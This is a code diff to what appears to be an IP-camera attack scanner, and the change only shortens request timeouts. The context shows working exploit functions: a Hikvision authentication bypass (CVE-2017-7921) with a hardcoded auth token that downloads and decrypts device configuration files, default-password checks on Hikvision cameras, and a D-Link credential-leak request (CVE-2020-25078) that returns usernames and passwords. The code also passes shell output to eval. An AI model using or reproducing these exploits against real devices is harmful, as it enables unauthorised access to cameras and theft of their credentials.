@@ -21,9 +21,9 @@ def cve_2017_7921(ip: str) -> list:
     user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
     config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
 
-    r = requests.get(user_url, timeout=8, verify=False, headers=headers)
+    r = requests.get(user_url, timeout=3, verify=False, headers=headers)
     if r.status_code == 200 and 'userName' in r.text and 'priority' in r.text and 'userLevel' in r.text:
-        rc = requests.get(config_url, timeout=20, verify=False, headers=headers)
+        rc = requests.get(config_url, timeout=8, verify=False, headers=headers)
         with open(f"{ip}-config", 'wb') as f:
             f.write(rc.content)
         info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
@@ -39,7 +39,7 @@ def hik_weak(ip, users=['admin'], passwords=['12345']) -> list:
     headers = {'User-Agent': get_user_agent()}
     for user in users:
         for p in passwords:
-            r = requests.get(f"http://{ip}/PSIA/System/deviceinfo", auth=(user, p), timeout=8, verify=False, headers=headers)
+            r = requests.get(f"http://{ip}/PSIA/System/deviceinfo", auth=(user, p), timeout=3, verify=False, headers=headers)
             if 'IP CAMERA' in r.text or 'IPCamera' in r.text:
                 return [True, 'hikvision weak pass', f"{user}:{p}"]
     return [False, 'hikvision weak pass']
@@ -48,7 +48,7 @@ def hik_weak(ip, users=['admin'], passwords=['12345']) -> list:
 def cve_2020_25078(ip: str) -> list:
     """DLink摄像头账号密码暴露漏洞"""
     headers = {'User-Agent': get_user_agent()}
-    r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=8, verify=False, headers=headers)
+    r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=3, verify=False, headers=headers)
     if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
         return [True, 'cve-2020-25078', ','.join(r.text.split())]
     return [False, 'cve-2020-25078']
